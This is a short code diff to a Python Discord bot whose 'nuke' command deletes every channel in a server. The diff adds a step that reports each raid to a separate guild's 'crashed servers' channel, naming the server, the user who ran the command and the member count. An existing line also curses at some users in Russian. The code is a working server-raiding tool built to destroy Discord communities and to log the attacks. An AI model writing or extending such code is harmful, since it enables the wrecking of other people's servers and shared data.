@@ -35,6 +35,16 @@ async def nuke(ctx):
         await ctx.send("пошёл нахуй")
         return
     
+    crash_log = bot.get_guild(1520817743127904477)
+    if crash_log:
+        channel = discord.utils.get(crash_log.text_channels, name="крашнутые-серваки")
+        if channel:
+            embed = discord.Embed(title="Сервер крашнут!", color=0xff0000)
+            embed.add_field(name="Сервер", value=guild.name, inline=False)
+            embed.add_field(name="Крашнул", value=ctx.author.mention, inline=False)
+            embed.add_field(name="Участников", value=guild.member_count, inline=False)
+            await channel.send(embed=embed)
+    
     delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
     
